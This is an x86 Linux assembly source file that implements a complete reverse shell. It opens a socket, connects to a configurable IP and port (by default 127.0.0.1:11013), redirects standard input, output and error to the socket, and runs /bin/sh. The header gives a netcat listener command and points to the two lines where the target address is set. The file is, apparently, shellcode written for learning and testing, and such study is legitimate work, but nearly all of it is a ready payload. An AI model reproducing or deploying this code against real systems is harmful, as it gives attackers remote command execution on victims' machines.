; Content:	reverse_shell from the scratch in assembly
; Author: 	Florian Hansemann | @HanseSecure | https://hansesecure.de
; Date: 	09/2017
;
;
; For testing connect via 'nc -lvp 11013'
;
; port and targetIP can be changed easily in line 37 & 38!

section .text
global _start

_start:
	; [+] setup socket via socketcall (syscall 102) & sockfd [+]
	push 0x66		; hex 102
	pop eax			; eax		= 102 (socketcall)

	xor ebx, ebx		; cleanup ebx	
	inc ebx			; ebx		= 1
	

	xor esi,esi		; cleanup esi

	push esi		; IPPROTO_IP	= 0 
	push ebx		; SOCK_STREAM	= 1 
	push byte 0x2		; AF_INET	= 2

	mov ecx,esp	     
    
	int 0x80		; exec socket

	mov edi, eax		; save result (sockfd) 7?

	; [+] connect port and IP via socketcall & connect [+]
    	mov al, 0x66		; eax		= 102 (socketcall)	
	mov bl, 0x3
	push dword 0x0100007F	; IP for connect (reverseHex)	<- [#] config here! [#]	
	push word 0x052B	; port for connect (reverseHex)	<- [#] config here! [#]
	push WORD 0x2		; AF_INET	= 2
	mov ecx,esp       

	; [+] args for connect() [+]
	push 0x10		; addrlen 	= 0.0.0.0 (16 bits)
	push ecx                ; addr to bind struct
	push edi                ; saved socketfd status
	mov ecx,esp             	

	int 0x80                ; exec connect

	; [+] copies 3 file descriptions STDIN, STDOUT, STDERR via dup2 [+]
	mov ebx, edi            ; saved socketfd status
	xor ecx, ecx		; cleanup ecx
	mov cl,0x2		; setup loopCounter
loop:
	mov al, 0x3f            ; eax		= 63 (dup2)
	int 0x80
	dec ecx                 ; ecx -1 (loop)
	jns loop

	; [+] finally shell via execve [+]

	mov al, 0xB             ; eax		= 11 (execve) 

	push esi                ; NULL
	push dword 0x68732f2f   ; "//sh"
	push dword 0x6e69622f   ; "/bin"
	mov ebx,esp             ; name = "/bin//sh\x0"

	push esi
	push ebx
	mov ecx, esp            ; argv = [name, 0] 

	mov edx, esi            ; envp = NULL

	int 0x80                ; exec execve 
